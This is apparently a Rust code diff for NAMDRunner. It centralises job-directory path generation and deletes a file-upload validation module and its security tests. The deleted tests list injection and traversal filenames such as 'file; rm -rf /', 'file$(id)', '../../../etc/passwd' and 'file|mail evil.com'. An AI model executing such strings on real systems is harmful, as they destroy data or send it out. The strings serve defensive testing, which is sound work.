@@ -142,7 +142,7 @@ pub mod input {
         // Check for absolute paths (should be relative to user directories)
         if path_obj.is_absolute() {
             // For our use case, absolute paths are actually expected
-            // (e.g., /projects/user/namdrunner_jobs/job_001)
+            // (e.g., /projects/user/{JOB_BASE_DIRECTORY}/job_001)
             // So we validate against allowed prefixes instead
         }
 
@@ -218,174 +218,11 @@ pub mod shell {
 }
 
 /// File validation utilities for NAMDRunner
-pub mod files {
-    use super::*;
-    use std::fs;
-
-    /// Maximum file size for uploads (1GB)
-    const MAX_FILE_SIZE: u64 = 1_073_741_824;
-
-    /// Input file structure for validation
-    #[derive(Debug)]
-    pub struct InputFile {
-        pub local_path: String,
-        pub remote_name: Option<String>,
-        pub file_type: FileType,
-    }
-
-    /// Types of files that can be uploaded
-    #[derive(Debug)]
-    pub enum FileType {
-        PDB,        // Protein Data Bank structure file
-        PSF,        // Protein Structure File
-        Parameter,  // CHARMM parameter file
-        Config,     // NAMD configuration file
-        Other,      // Other file types
-    }
-
-    /// Validate a file for upload
-    ///
-    /// Checks:
-    /// - File exists and is readable
-    /// - File size is within limits
-    /// - Remote filename is safe (if provided)
-    /// - File type matches expected format (for known types)
-    pub fn validate_upload_file(file: &InputFile) -> Result<()> {
-        // Check local file exists
-        let local_path = Path::new(&file.local_path);
-        if !local_path.exists() {
-            return Err(anyhow!("Local file does not exist: {}", file.local_path));
-        }
-
-        // Check file is readable
-        if let Err(e) = fs::File::open(local_path) {
-            return Err(anyhow!("Cannot read local file: {}", e));
-        }
-
-        // Check file size
-        let metadata = fs::metadata(local_path)?;
-        if metadata.len() > MAX_FILE_SIZE {
-            return Err(anyhow!("File too large: {} bytes (max 1GB)", metadata.len()));
-        }
-
-        // Validate remote filename if provided
-        if let Some(remote_name) = &file.remote_name {
-            validate_remote_filename(remote_name)?;
-        }
-
-        // Validate file type specific requirements
-        validate_file_type(local_path, &file.file_type)?;
-
-        Ok(())
-    }
-
-    /// Validate a remote filename for safety
-    pub fn validate_remote_filename(filename: &str) -> Result<()> {
-        // No path separators allowed
-        if filename.contains('/') || filename.contains('\\') {
-            return Err(anyhow!("Remote filename cannot contain path separators"));
-        }
-
-        // No null bytes or empty names
-        if filename.contains('\0') || filename.is_empty() {
-            return Err(anyhow!("Invalid remote filename"));
-        }
-
-        // No directory traversal patterns
-        if filename.contains("..") {
-            return Err(anyhow!("Remote filename cannot contain directory traversal sequences"));
-        }
-
-        // No shell metacharacters
-        let dangerous_chars = ['$', '`', ';', '|', '&', '>', '<', '(', ')', '{', '}', '[', ']', '\'', '"'];
-        if filename.chars().any(|c| dangerous_chars.contains(&c)) {
-            return Err(anyhow!("Remote filename contains shell metacharacters"));
-        }
-
-        Ok(())
-    }
-
-    /// Validate file content matches expected type
-    fn validate_file_type(path: &Path, file_type: &FileType) -> Result<()> {
-        match file_type {
-            FileType::PDB => {
-                // PDB files should have .pdb extension
-                if !path.extension().map_or(false, |ext| ext.eq_ignore_ascii_case("pdb")) {
-                    return Err(anyhow!("PDB file should have .pdb extension"));
-                }
-            },
-            FileType::PSF => {
-                // PSF files should have .psf extension
-                if !path.extension().map_or(false, |ext| ext.eq_ignore_ascii_case("psf")) {
-                    return Err(anyhow!("PSF file should have .psf extension"));
-                }
-            },
-            FileType::Parameter => {
-                // Parameter files typically have .prm, .par, or .str extensions
-                let valid_exts = ["prm", "par", "str", "inp"];
-                if !path.extension().map_or(false, |ext|
-                    valid_exts.iter().any(|&valid| ext.eq_ignore_ascii_case(valid))
-                ) {
-                    return Err(anyhow!("Parameter file should have .prm, .par, .str, or .inp extension"));
-                }
-            },
-            FileType::Config => {
-                // NAMD config files typically have .conf or .namd extensions
-                let valid_exts = ["conf", "namd", "config"];
-                if !path.extension().map_or(false, |ext|
-                    valid_exts.iter().any(|&valid| ext.eq_ignore_ascii_case(valid))
-                ) {
-                    return Err(anyhow!("Config file should have .conf, .namd, or .config extension"));
-                }
-            },
-            FileType::Other => {
-                // No specific validation for other file types
-            }
-        }
-        Ok(())
-    }
-
-    /// Validate that required NAMD files are present
-    ///
-    /// A NAMD job requires:
-    /// - At least one .pdb file (structure)
-    /// - At least one .psf file (topology)
-    /// - At least one .prm file (parameters)
-    pub fn validate_required_namd_files(files: &[String]) -> Result<()> {
-        let mut has_pdb = false;
-        let mut has_psf = false;
-        let mut has_prm = false;
-
-        for file in files {
-            let path = Path::new(file);
-            if let Some(ext) = path.extension() {
-                let ext_lower = ext.to_string_lossy().to_lowercase();
-                match ext_lower.as_str() {
-                    "pdb" => has_pdb = true,
-                    "psf" => has_psf = true,
-                    "prm" | "par" | "str" => has_prm = true,
-                    _ => {}
-                }
-            }
-        }
-
-        if !has_pdb {
-            return Err(anyhow!("Missing required PDB file (.pdb). A structure file is required for NAMD jobs."));
-        }
-        if !has_psf {
-            return Err(anyhow!("Missing required PSF file (.psf). A topology file is required for NAMD jobs."));
-        }
-        if !has_prm {
-            return Err(anyhow!("Missing required parameter file (.prm, .par, or .str). Parameter files are required for NAMD jobs."));
-        }
-
-        Ok(())
-    }
-}
-
+// DELETED: files module - file validation now handled by template system
 /// Directory path utilities for NAMDRunner
 pub mod paths {
     use super::*;
+    use crate::ssh::directory_structure::JobDirectoryStructure;
 
     /// Generate a safe project directory path for a user and job
     pub fn project_directory(username: &str, job_id: &str) -> Result<String> {
@@ -393,15 +230,16 @@ pub mod paths {
         let clean_job_id = super::input::sanitize_job_id(job_id)?;
 
         let (path, allowed_prefixes) = if cfg!(windows) {
-            let path = format!("C:\\Users\\{}\\namdrunner_jobs\\{}", clean_username, clean_job_id);
+            let path = format!("C:\\Users\\{}\\{}\\{}", clean_username, crate::ssh::directory_structure::JOB_BASE_DIRECTORY, clean_job_id);
             (path, vec!["C:\\Users\\"])
         } else {
-            let path = format!("/projects/{}/namdrunner_jobs/{}", clean_username, clean_job_id);
-            (path, vec!["/projects/"])
+            // Use centralized function for consistent path generation
+            let path = JobDirectoryStructure::project_dir(&clean_username, &clean_job_id);
+            (path, JobDirectoryStructure::project_allowed_prefixes())
         };
 
         // Validate the path is within allowed directories
-        super::input::validate_path_safety(&path, &allowed_prefixes.iter().map(|s| *s).collect::<Vec<_>>())?;
+        super::input::validate_path_safety(&path, &allowed_prefixes.to_vec())?;
 
         Ok(path)
     }
@@ -412,15 +250,16 @@ pub mod paths {
         let clean_job_id = super::input::sanitize_job_id(job_id)?;
 
         let (path, allowed_prefixes) = if cfg!(windows) {
-            let path = format!("C:\\scratch\\{}\\namdrunner_jobs\\{}", clean_username, clean_job_id);
+            let path = format!("C:\\scratch\\{}\\{}\\{}", clean_username, crate::ssh::directory_structure::JOB_BASE_DIRECTORY, clean_job_id);
             (path, vec!["C:\\scratch\\"])
         } else {
-            let path = format!("/scratch/alpine/{}/namdrunner_jobs/{}", clean_username, clean_job_id);
-            (path, vec!["/scratch/"])
+            // Use centralized function for consistent path generation
+            let path = JobDirectoryStructure::scratch_dir(&clean_username, &clean_job_id);
+            (path, JobDirectoryStructure::scratch_allowed_prefixes())
         };
 
         // Validate the path is within allowed directories
-        super::input::validate_path_safety(&path, &allowed_prefixes.iter().map(|s| *s).collect::<Vec<_>>())?;
+        super::input::validate_path_safety(&path, &allowed_prefixes.to_vec())?;
 
         Ok(path)
     }
@@ -504,13 +343,17 @@ mod tests {
 
         #[test]
         fn test_path_validation() {
+            use crate::ssh::directory_structure::JobDirectoryStructure;
             // Valid paths - cross-platform
             if cfg!(windows) {
-                assert!(input::validate_path_safety("C:\\Users\\user\\namdrunner_jobs\\job_001", &["C:\\Users\\"]).is_ok());
-                assert!(input::validate_path_safety("C:\\scratch\\user\\namdrunner_jobs\\job_001", &["C:\\scratch\\"]).is_ok());
+                assert!(input::validate_path_safety(&format!("C:\\Users\\user\\{}\\job_001", crate::ssh::directory_structure::JOB_BASE_DIRECTORY), &["C:\\Users\\"]).is_ok());
+                assert!(input::validate_path_safety(&format!("C:\\scratch\\user\\{}\\job_001", crate::ssh::directory_structure::JOB_BASE_DIRECTORY), &["C:\\scratch\\"]).is_ok());
             } else {
-                assert!(input::validate_path_safety("/projects/user/namdrunner_jobs/job_001", &["/projects/"]).is_ok());
-                assert!(input::validate_path_safety("/scratch/alpine/user/namdrunner_jobs/job_001", &["/scratch/"]).is_ok());
+                // Use centralized path generation for consistent testing
+                let project_path = JobDirectoryStructure::project_dir("user", "job_001");
+                let scratch_path = JobDirectoryStructure::scratch_dir("user", "job_001");
+                assert!(input::validate_path_safety(&project_path, &JobDirectoryStructure::project_allowed_prefixes()).is_ok());
+                assert!(input::validate_path_safety(&scratch_path, &JobDirectoryStructure::scratch_allowed_prefixes()).is_ok());
             }
 
             // Invalid paths (if they could be resolved)
@@ -535,21 +378,27 @@ mod tests {
 
         #[test]
         fn test_project_directory_generation() {
+            use crate::ssh::directory_structure::JobDirectoryStructure;
             let result = paths::project_directory("testuser", "job_001").unwrap();
             if cfg!(windows) {
-                assert_eq!(result, "C:\\Users\\testuser\\namdrunner_jobs\\job_001");
+                assert_eq!(result, format!("C:\\Users\\testuser\\{}\\job_001", crate::ssh::directory_structure::JOB_BASE_DIRECTORY));
             } else {
-                assert_eq!(result, "/projects/testuser/namdrunner_jobs/job_001");
+                // Should match centralized path generation
+                let expected = JobDirectoryStructure::project_dir("testuser", "job_001");
+                assert_eq!(result, expected);
             }
         }
 
         #[test]
         fn test_scratch_directory_generation() {
+            use crate::ssh::directory_structure::JobDirectoryStructure;
             let result = paths::scratch_directory("testuser", "job_001").unwrap();
             if cfg!(windows) {
-                assert_eq!(result, "C:\\scratch\\testuser\\namdrunner_jobs\\job_001");
+                assert_eq!(result, format!("C:\\scratch\\testuser\\{}\\job_001", crate::ssh::directory_structure::JOB_BASE_DIRECTORY));
             } else {
-                assert_eq!(result, "/scratch/alpine/testuser/namdrunner_jobs/job_001");
+                // Should match centralized path generation
+                let expected = JobDirectoryStructure::scratch_dir("testuser", "job_001");
+                assert_eq!(result, expected);
             }
         }
 
@@ -662,42 +511,7 @@ mod tests {
         }
     }
 
-    mod files_security_tests {
-        use super::*;
-
-        #[test]
-        fn test_remote_filename_validation() {
-            // Valid filenames should pass
-            let valid_names = vec!["normal.txt", "file_123.pdb", "data-2023.log"];
-            for name in valid_names {
-                assert!(files::validate_remote_filename(name).is_ok(),
-                        "Valid filename should pass: {}", name);
-            }
-
-            // Malicious filenames should fail
-            let malicious_names = vec![
-                "../../../etc/passwd",    // Directory traversal
-                "file; rm -rf /",         // Command injection
-                "file`whoami`",          // Command substitution
-                "file$(id)",             // Command substitution
-                "file|mail evil.com",    // Pipe
-                "file&background",       // Background
-                "file>redirect",         // Redirect
-                "file<input",            // Input redirect
-                "file'quote",            // Single quote
-                "file\"quote",           // Double quote
-                "file\0hidden",          // Null byte
-                "",                      // Empty
-                "path/with/slash",       // Path separator
-                "path\\with\\backslash", // Windows path separator
-            ];
-
-            for name in malicious_names {
-                assert!(files::validate_remote_filename(name).is_err(),
-                        "Malicious filename should fail: {}", name);
-            }
-        }
-    }
+    // DELETED: files_security_tests module - tested deleted files module
 
     mod integration_tests {
         use super::*;
@@ -783,39 +597,7 @@ mod tests {
             }
         }
 
-        #[test]
-        fn test_file_validation_integration() {
-            // Test file validation prevents security issues (business logic only)
-            let malicious_filenames = vec![
-                "../../../etc/passwd",
-                "file; rm -rf /",
-                "file$(whoami)",
-                "file`id`",
-                "file|mail evil.com",
-                "file\0hidden",
-                "path/with/separators",
-            ];
-
-            for filename in malicious_filenames {
-                let result = files::validate_remote_filename(filename);
-                assert!(result.is_err(),
-                        "Should reject malicious filename: {}", filename);
-            }
-
-            // Valid filenames should pass
-            let valid_filenames = vec![
-                "normal.txt",
-                "file_123.pdb",
-                "data-2023.log",
-                "structure.psf",
-            ];
-
-            for filename in valid_filenames {
-                let result = files::validate_remote_filename(filename);
-                assert!(result.is_ok(),
-                        "Should accept valid filename: {}", filename);
-            }
-        }
+        // DELETED: test_file_validation_integration - tested deleted files::validate_remote_filename
 
         #[test]
         fn test_centralized_validation_consistency() {
